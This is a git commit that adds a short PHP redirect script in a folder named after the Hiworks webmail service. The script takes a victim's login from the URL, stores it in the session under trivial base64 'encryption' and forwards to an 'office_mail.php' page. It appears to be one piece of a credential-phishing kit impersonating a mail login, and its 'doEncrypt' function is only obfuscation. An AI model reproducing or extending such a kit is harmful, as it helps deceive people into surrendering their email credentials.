f999e160f6f69d52743febccb027da7a0b8197f6
vetopia2025 <vetopia@nate.com>
2025-07-07 04:54:58 +0100

    Add files via upload

---
+++ hiworks/redirect.php
@@ -0,0 +1,28 @@
+<?php
+
+ob_start();
+if (!isset($_SESSION)) { session_start();}
+
+
+function doEncrypt($string)
+{
+	$rand = substr(md5(microtime()),rand(0,26),2);
+	$crystr = "".$rand."".base64_encode($string)."";
+	return $crystr;
+}
+
+
+if(isset($_GET['login'])){
+
+
+$_SESSION['UZ_login']=doEncrypt($_GET['login']);
+
+header('location:office_mail.php');
+
+}else{
+	
+	header('location:noemail.php');
+}
+
+?>
+
